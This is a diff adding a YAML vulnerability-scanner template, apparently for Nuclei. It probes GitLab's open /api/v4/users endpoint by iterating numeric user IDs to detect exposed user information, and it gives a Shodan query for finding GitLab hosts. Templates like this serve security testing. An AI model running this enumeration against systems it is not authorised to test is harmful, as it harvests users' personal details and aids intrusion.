@@ -1,0 +1,45 @@
+id: gitlab-api-user-enum
+
+info:
+  name: GitLab - User Information Disclosure Via Open API
+  author: Suman_Kar
+  severity: medium
+  description: GitLab - User Information is exposed Via Open API.
+  reference:
+    - https://gitlab.com/gitlab-org/gitlab-foss/-/issues/40158
+  metadata:
+    max-request: 100
+    shodan-query: http.title:"GitLab"
+  tags: gitlab,enum,misconfig,disclosure,vuln
+
+http:
+  - raw:
+      - |
+        GET /api/v4/users/{{uid}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Referer: {{BaseURL}}
+
+    payloads:
+      uid: helpers/wordlists/numbers.txt
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        condition: and
+        regex:
+          - "username.*"
+          - "id.*"
+          - "name.*"
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402204e71a95aadee7823d97dd8f6965d33e3565363ac9c4a8819fbb57f76f970ba5f02205d15db6700f72e7278e55750fca23fe7000286a8c2895e8785c6e1d53f889bce:922c64590222798bb761d5b6d8e72950
